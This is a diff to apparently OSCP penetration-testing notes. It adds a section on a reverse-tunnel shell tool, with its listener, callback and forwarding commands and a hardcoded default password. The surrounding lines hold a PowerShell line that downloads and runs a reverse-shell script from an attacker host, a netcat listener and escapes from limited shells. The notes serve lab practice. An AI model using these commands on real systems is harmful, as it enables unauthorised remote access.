@@ -50,6 +50,18 @@ stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>
 IEX(IWR -UseBasicParsing http://<LHOST>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <LHOST> <LPORT>
 - [ ] With a credential, evil-winrm or RDP beats any shell here
 
+## shell-tunnel: PTY, SFTP and all three forwardings in one binary
+After tool install shell-tunnel at the pwn-broker prompt. Catch the callback on Kali:
+shell-tunnel -l -v -p <LPORT>
+The upload runs on the target and dials home; -d detaches it from an evil-winrm window, and -b 0 picks a random port on Kali, printed in the listener's [ok] line:
+shell-tunnel.exe -d -p <LPORT> -b 0 svc@<LHOST>
+A stock ssh client then gets the full PTY; the same session carries SFTP and the -L, -R and -D forwards:
+ssh -p THE-BIND-PORT svc@127.0.0.1
+sftp -P THE-BIND-PORT svc@127.0.0.1
+- [ ] Bind mode instead: shell-tunnel -l -v -p <LPORT> on the target, then ssh -p <LPORT> svc@<TargetIP>
+- [ ] The packaged build is the generic one, user svc with password letmeinbrudipls (shell-tunnel -h prints both); the repo's build.sh bakes in a fresh random password, an authorized key, TLS wrapping and auto-detach
+- [ ] Not on the OSCP exam: a prebuilt SSH payload is kept out as a safe reading; nc, socat and plain ssh cover the exam
+
 ## Out of a limited shell
 In vi or vim: :!bash, or :set shell=/bin/bash then :shell
 In less, more or man: !bash
